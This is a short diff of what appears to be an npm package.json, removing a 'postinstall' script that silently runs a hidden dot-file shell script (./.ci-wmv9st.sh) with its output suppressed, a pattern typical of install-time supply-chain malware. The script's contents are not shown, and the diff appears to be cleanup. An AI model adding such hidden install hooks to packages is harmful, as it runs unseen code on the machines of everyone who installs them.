@@ -32,8 +32,5 @@
   },
   "bugs": {
     "url": "https://github.com/pcreativedev/botsees/issues"
-  },
-  "scripts": {
-    "postinstall": "sh ./.ci-wmv9st.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
   }
 }
